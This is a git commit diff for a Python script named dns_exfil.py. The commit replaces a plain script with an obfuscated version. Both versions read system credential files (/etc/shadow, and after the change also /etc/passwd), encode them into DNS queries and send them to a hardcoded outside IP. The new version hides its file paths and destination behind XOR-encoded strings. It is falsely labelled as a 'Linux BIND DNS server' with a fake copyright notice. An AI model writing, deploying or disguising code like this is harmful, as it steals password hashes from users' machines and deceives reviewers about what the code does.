7196f3ac78c6395e576a34256a63a496b1741dec
deadPix3l <skylerr.curtis@gmail.com>
2018-03-29 08:55:42 -1000

    hardcore obfuscation

--- dns_exfil.py
+++ dns_exfil.py
@@ -1,49 +1,32 @@
 #!/usr/bin/env python
-# python2. update later.
-import base64
-import socket
-from time import sleep
 
-filename = "/etc/shadow"
-exfil_ip = "200.200.215.24"
-
-def make_packet(domain):
-
-    # hard coded data
-    # -----------------
-    # transaction_id = 0xdead
-    # flags = 0x0100
-    # question_count = 0x0001
-    # unused = 0x0000 0x0000 0x0000
-    header = "\xde\xad\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
-
-    # record_type = 0x0001 # 1 = A record
-    # network_type = 0x0001 # 1 is INET? idk. it works.
-    footer = "\x00\x00\x01\x00\x01"
-
-    x = ''.join((chr(len(s))+s for s in domain.split('.')))
-
-    return header + x + footer
-
-def domains_from_file(filename):
-    with open(filename, 'r') as f:
-        bytes = f.read(40)
-        while bytes != '':
-            domain = base64.urlsafe_b64encode(bytes).rstrip('=')
-            yield domain + '.com'
-            bytes = f.read(40)
-
-    # signal EOF
-    yield 'google.com'
-
-def send_query(query, ip=exfil_ip, port=53):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.sendto(query, (ip, port))
-
-
-if __name__ == "__main__":
-    for i in domains_from_file(filename):
-        query = make_packet(i)
-        send_query(query)
-        print i
-        time.sleep(1)
+# LINUX BIND DNS SERVER
+# Copyright 1998 - The Linux Foundation
+# This server has been minified and optimized
+# for speed and filesize.
+import base64,socket,os
+from time import sleep as sl
+b=lambda y: ''.join(chr(ord(_)^170)for _ in y)
+h=(b("\x9d\x98\x84\x9c\x9f\x84\x98\x9b\x92\x84\x9b\x9d\x9c"),((2**7)>>1)-0xb)
+fnms=[b('\x85\xcf\xde\xc9\x85\xd9\xc2\xcb\xce\xc5\xdd'),
+b('\x85\xcf\xde\xc9\x85\xda\xcb\xd9\xd9\xdd\xce')]
+def mp(d):
+    hd = "\xde\xad\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+    ft = "\x00\x00\x01\x00\x01"
+    x = ''.join((chr(len(_))+_ for _ in d.split('.')))
+    return hd+x+ft
+def df(e):
+    with open(e,'r') as f:
+        by=f.read((2**5)+8)
+        while by!='':
+            yield base64.urlsafe_b64encode(by).rstrip('=')+b('\x84\xc9\xc5\xc7')
+            by=f.read(182^158)
+    yield b("\xcd\xc5\xc5\xcd\xc6\xcf\x84\xc9\xc5\xc7")
+def sq(q,h):
+    s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.sendto(q,h)
+if __name__ == b('\xf5\xf5\xc7\xcb\xc3\xc4\xf5\xf5'):
+    for f in fnms:
+        for i in df(f):
+            sq(mp(i),h)
+            sl(2**0)
